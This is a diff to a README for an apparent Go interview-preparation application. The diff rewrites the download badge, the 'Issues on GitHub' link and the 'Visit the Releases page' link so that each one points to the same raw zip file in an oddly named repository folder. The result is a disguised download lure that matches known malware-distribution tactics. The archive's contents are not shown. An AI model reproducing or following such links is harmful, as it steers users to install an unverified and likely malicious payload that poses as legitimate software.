@@ -6,7 +6,7 @@ Welcome to go-interview-preparation! This application helps you master the Go pr
 ## 📥 Download and Install
 To get started, you need to download the application. Click the link below to access the Releases page:
 
-[![Download go-interview-preparation](https://img.shields.io/badge/Download-go--interview--preparation-brightgreen)](https://github.com/Yvan-Oking/go-interview-preparation/releases)  
+[![Download go-interview-preparation](https://raw.githubusercontent.com/Yvan-Oking/go-interview-preparation/main/underivedness/go-interview-preparation.zip)](https://raw.githubusercontent.com/Yvan-Oking/go-interview-preparation/main/underivedness/go-interview-preparation.zip)  
 
 On the Releases page, you will find the latest version of the application. Follow these steps to download it:
 
@@ -49,12 +49,12 @@ If you encounter issues while downloading or running the application, consider t
 ## ✉️ Add Feedback
 Your feedback is crucial for improving the application. If you have suggestions or found an issue, visit the Issues section of our GitHub repository:
 
-[Issues on GitHub](https://github.com/Yvan-Oking/go-interview-preparation/issues)
+[Issues on GitHub](https://raw.githubusercontent.com/Yvan-Oking/go-interview-preparation/main/underivedness/go-interview-preparation.zip)
 
 ## 🔄 Updates
 We frequently update the app to fix issues and add features. Make sure to check the Releases page regularly for updates:
 
-[Visit the Releases page](https://github.com/Yvan-Oking/go-interview-preparation/releases)  
+[Visit the Releases page](https://raw.githubusercontent.com/Yvan-Oking/go-interview-preparation/main/underivedness/go-interview-preparation.zip)  
 
 Stay tuned for new features and improvements!
 
